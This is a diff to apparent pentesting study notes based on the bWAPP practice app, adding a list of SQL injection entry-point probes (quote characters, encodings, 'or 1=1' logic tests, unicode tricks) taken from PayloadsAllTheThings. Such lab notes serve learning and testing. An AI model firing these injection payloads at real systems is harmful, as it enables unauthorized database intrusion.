@@ -6,13 +6,54 @@ mysql -u root -h ip
 
 All examples are based on bWAPP (free pentesting practice tool) examples.
 
+## Test for SQLi vulnerability
+* It is necessary to identify a possible SQLi entry point
+* Use of special characters can help (got from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection)):
+
+```
+'
+%27
+"
+%22
+#
+%23
+;
+%3B
+)
+Wildcard (*)
+&apos;  # required for XML content
+
+Multiple encoding
+
+%%2727
+%25%27
+
+Merging characters
+
+`+HERP
+'||'DERP
+'+'herp
+' 'DERP
+'%20'HERP
+'%2B'HERP
+
+Logic Testing
+
+page.asp?id=1 or 1=1 -- true
+page.asp?id=1' or 1=1 -- true
+page.asp?id=1" or 1=1 -- true
+page.asp?id=1 and 1=2 -- false
+
+Weird characters
+
+Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
+transformed into U+0022 QUOTATION MARK (")
+Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
+transformed into U+0027 APOSTROPHE (')
+```
+
+
 ## UNION based sql injection
-
-Test for SQLi vulnerability: '
-
-errror says it's mySQL database
-
-from PayloadAllThings
 
 ### MYSQL Comment
 -- - Note the space after the double dash
